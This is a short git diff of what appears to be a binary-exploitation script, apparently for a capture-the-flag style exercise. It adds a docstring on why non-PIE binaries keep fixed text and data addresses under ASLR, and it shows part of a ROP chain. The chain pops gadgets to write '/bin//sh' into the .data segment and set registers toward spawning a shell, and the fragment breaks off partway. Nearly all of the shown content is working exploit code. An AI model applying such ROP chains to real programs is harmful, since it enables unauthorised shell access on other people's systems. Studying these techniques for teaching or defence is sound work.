@@ -44,11 +44,18 @@ byte_int_try = 0
 
 cover_rbp = b'\x01' * 8
 
+"""
+Due to ASLR, libraries, heap, and stack segments are randomized each time.
+However, if the program isn't build as PIE, text, data and BSS segments aren't being randomized by ASLR.
+So that, we can explot the vulnerability of fixed address of text, data and BSS segments.
+Furthermore, ROP chains are easier to construct in non-PIE programs due to the fixed text segment.
+"""
+
 rop_chain = b""
 rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
 rop_chain += p64(0x68732f2f6e69622f) # var:("/bin//sh")
 rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
-rop_chain += p64(0x00000000006d2000) # var:(@.data)
+rop_chain += p64(0x00000000006d2000) # var:(.data segment)
 rop_chain += p64(0x0000000000435693) # -> mov qword ptr [rdi], rdx; ret;
 rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
 rop_chain += p64(0x0000000000000000) # var:(0)
